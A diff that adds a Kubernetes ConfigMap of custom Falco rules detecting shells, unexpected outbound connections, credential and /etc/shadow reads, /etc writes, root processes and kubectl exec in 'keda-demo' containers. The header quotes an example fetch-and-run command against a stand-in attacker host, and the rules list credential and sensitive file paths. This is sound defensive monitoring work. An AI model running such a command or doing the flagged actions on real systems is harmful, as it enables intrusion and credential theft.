@@ -1,0 +1,222 @@
+# =============================================================================
+# monitoring/falco-rules.yaml — Custom Falco Runtime Security Rules
+# =============================================================================
+# Falco monitors Linux system calls in real-time and fires alerts when
+# behaviour deviates from expected baselines for our containers.
+#
+# Why runtime security (Falco) complements build-time security (Trivy/OPA)?
+#   Trivy:  Catches vulnerable package versions at build time.
+#   OPA:    Validates Kubernetes manifest configuration at deploy time.
+#   Falco:  Detects actual attacks WHILE containers are running.
+#
+#   Example attack that Trivy/OPA cannot catch:
+#     A compromised npm dependency executes: curl http://attacker.com/shell.sh | sh
+#     Trivy: no CVE for the dep (0-day). OPA: manifest was valid. FALCO: FIRES.
+#     "Unexpected outbound connection from keda-demo-app to unknown IP"
+#
+# How Falco works:
+#   Falco loads a kernel module (or eBPF probe) that intercepts every
+#   system call. Each syscall is matched against rules. When a rule
+#   matches: Falco emits an alert to stdout/syslog/webhook.
+#
+# Rule anatomy:
+#   - rule: <name>
+#     desc: <description>
+#     condition: <Falco filter expression (boolean, using syscall fields)>
+#     output: <alert string (can use field references like %container.name)>
+#     priority: CRITICAL | ERROR | WARNING | NOTICE | INFO | DEBUG
+#     tags: [<category tags>]
+#
+# Apply:
+#   # Mount this ConfigMap into the Falco DaemonSet
+#   kubectl apply -f monitoring/falco-rules.yaml
+#   kubectl apply -f monitoring/falco-deployment.yaml
+#
+# Test:
+#   kubectl exec -it -n keda-demo <pod> -- sh     # Triggers: shell spawned
+#   kubectl exec -it -n keda-demo <pod> -- cat /etc/shadow  # Triggers: sensitive read
+# =============================================================================
+
+---
+# ConfigMap: mounts custom rules into the Falco DaemonSet
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: falco-custom-rules
+  namespace: falco
+  labels:
+    app.kubernetes.io/name: falco
+    app.kubernetes.io/component: rules
+    app.kubernetes.io/part-of: smartscale-ai
+  annotations:
+    smartscale.ai/description: "Custom Falco rules for SmartScale AI KEDA EKS workloads"
+data:
+  smartscale-rules.yaml: |
+    # ── Rule 1: Shell Spawned Inside Application Container ────────────────────
+    # Normal SQS consumer (app.py) never shells out. If /bin/sh or /bin/bash
+    # is spawned inside the container, it's almost certainly an attacker or
+    # an accidental `kubectl exec` during a production incident.
+    #
+    # Legitimate exception: kubectl exec -it ... -- python (for debugging)
+    # → Add 'python' to the proc.name check or use a separate rule with NOTICE.
+    - rule: Shell Spawned in SmartScale Container
+      desc: >
+        A shell (sh/bash/dash) was spawned inside a keda-demo pod.
+        Expected: never. Possible causes: attacker RCE, kubectl exec misuse.
+      condition: >
+        spawned_process
+        and container
+        and container.name startswith "keda-demo"
+        and proc.name in (shell_binaries)
+        and not proc.pname in (shell_binaries)
+      output: >
+        Shell spawned in SmartScale container
+        (user=%user.name container=%container.name pod=%k8s.pod.name
+         image=%container.image.repository proc=%proc.name
+         parent=%proc.pname cmdline=%proc.cmdline)
+      priority: CRITICAL
+      tags: [smartscale, shell, container_escape, mitre_execution]
+
+    # ── Rule 2: Unexpected Outbound Connection ────────────────────────────────
+    # The SQS consumer only connects to:
+    #   - SQS endpoint (amazonaws.com or local ElasticMQ port 9324)
+    #   - Prometheus metrics port 8080
+    # Any other outbound connection is suspicious (C2, data exfiltration).
+    - rule: Unexpected Outbound Network Connection from SmartScale
+      desc: >
+        A network connection to an unexpected destination was made from a
+        keda-demo container. Expected destinations: AWS SQS endpoints, ElasticMQ.
+      condition: >
+        outbound
+        and container
+        and container.name startswith "keda-demo"
+        and not fd.sip.name in (
+          "amazonaws.com",
+          "sqs.us-east-1.amazonaws.com",
+          "sts.amazonaws.com"
+        )
+        and not fd.sport in ("9324", "8080", "8081", "8090", "443", "80")
+        and not fd.dip in ("127.0.0.1", "::1")
+      output: >
+        Unexpected outbound connection from SmartScale container
+        (container=%container.name pod=%k8s.pod.name
+         dst=%fd.name dip=%fd.rip dport=%fd.rport
+         proc=%proc.name user=%user.name)
+      priority: ERROR
+      tags: [smartscale, network, data_exfiltration, mitre_exfiltration]
+
+    # ── Rule 3: AWS Credential File Read ─────────────────────────────────────
+    # The app uses IRSA (IAM Roles for Service Accounts) via the projected
+    # token at /var/run/secrets/eks.amazonaws.com/serviceaccount/token.
+    # Reading ~/.aws/credentials or /etc/aws/credentials is unexpected and
+    # may indicate an attacker attempting to steal static credentials.
+    - rule: AWS Credential File Read in SmartScale Container
+      desc: >
+        A process read an AWS static credential file (~/.aws/credentials).
+        SmartScale uses IRSA (web identity token), not static credentials.
+        This may indicate credential theft.
+      condition: >
+        open_read
+        and container
+        and container.name startswith "keda-demo"
+        and fd.name in (
+          "/root/.aws/credentials",
+          "/home/.aws/credentials",
+          "/etc/aws/credentials"
+        )
+      output: >
+        AWS credential file read in SmartScale container
+        (file=%fd.name container=%container.name pod=%k8s.pod.name
+         proc=%proc.name user=%user.name cmdline=%proc.cmdline)
+      priority: CRITICAL
+      tags: [smartscale, aws, credential_access, mitre_credential_access]
+
+    # ── Rule 4: Write to /etc in Container ───────────────────────────────────
+    # Writing to /etc/ (e.g., /etc/passwd, /etc/hosts) is a classic attacker
+    # technique for persistence (adding backdoor user) or lateral movement
+    # (DNS poisoning via /etc/hosts).
+    - rule: Write to /etc in SmartScale Container
+      desc: >
+        A process wrote to the /etc/ directory inside a keda-demo container.
+        Application code never writes to /etc/. This may indicate an attacker
+        attempting persistence via /etc/passwd modification.
+      condition: >
+        open_write
+        and container
+        and container.name startswith "keda-demo"
+        and fd.name startswith "/etc/"
+        and not fd.name in ("/etc/localtime", "/etc/timezone")
+      output: >
+        Write to /etc in SmartScale container
+        (file=%fd.name container=%container.name pod=%k8s.pod.name
+         proc=%proc.name user=%user.name)
+      priority: ERROR
+      tags: [smartscale, persistence, mitre_persistence]
+
+    # ── Rule 5: Sensitive File Read ───────────────────────────────────────────
+    # Reading /etc/shadow (password hashes), /etc/sudoers, or similar sensitive
+    # files is never done by the SQS consumer. Indicates privilege escalation
+    # attempt or container reconnaissance.
+    - rule: Sensitive File Read in SmartScale Container
+      desc: >
+        A process read a sensitive system file inside a keda-demo container.
+        The SQS consumer never reads /etc/shadow, /etc/sudoers, or similar.
+      condition: >
+        open_read
+        and container
+        and container.name startswith "keda-demo"
+        and fd.name in (
+          "/etc/shadow",
+          "/etc/sudoers",
+          "/etc/sudoers.d",
+          "/proc/1/environ",
+          "/proc/1/maps"
+        )
+      output: >
+        Sensitive file read in SmartScale container
+        (file=%fd.name container=%container.name pod=%k8s.pod.name
+         proc=%proc.name user=%user.name)
+      priority: WARNING
+      tags: [smartscale, discovery, mitre_discovery]
+
+    # ── Rule 6: Container Running as Root ─────────────────────────────────────
+    # Even if OPA Gatekeeper warns/blocks non-root at admission, this rule
+    # catches running containers that slipped through (e.g., before policies
+    # were applied, or via privileged DaemonSet).
+    - rule: Process Running as Root in SmartScale Container
+      desc: >
+        A new process started as UID 0 (root) in a keda-demo container.
+        SmartScale containers should run as non-root (USER appuser in Dockerfile).
+      condition: >
+        spawned_process
+        and container
+        and container.name startswith "keda-demo"
+        and user.uid = 0
+        and not proc.name in ("pause")
+      output: >
+        Root process spawned in SmartScale container
+        (proc=%proc.name uid=%user.uid container=%container.name
+         pod=%k8s.pod.name image=%container.image.repository)
+      priority: WARNING
+      tags: [smartscale, privilege_escalation, mitre_privilege_escalation]
+
+    # ── Rule 7: kubectl exec Detected ────────────────────────────────────────
+    # When a developer runs kubectl exec into a production pod, Falco detects
+    # the pseudo-terminal attachment. This should be logged and reviewed.
+    # Not blocked (sometimes legitimate) but always audited.
+    - rule: kubectl exec into SmartScale Pod
+      desc: >
+        A kubectl exec session was started into a keda-demo pod.
+        Legitimate uses: incident investigation, one-off debugging.
+        Review: confirm with the developer who ran this command.
+      condition: >
+        spawned_process
+        and container
+        and container.name startswith "keda-demo"
+        and proc.tty != 0
+      output: >
+        kubectl exec detected in SmartScale pod
+        (proc=%proc.name tty=%proc.tty container=%container.name
+         pod=%k8s.pod.name user=%user.name)
+      priority: NOTICE
+      tags: [smartscale, audit, kubectl_exec]
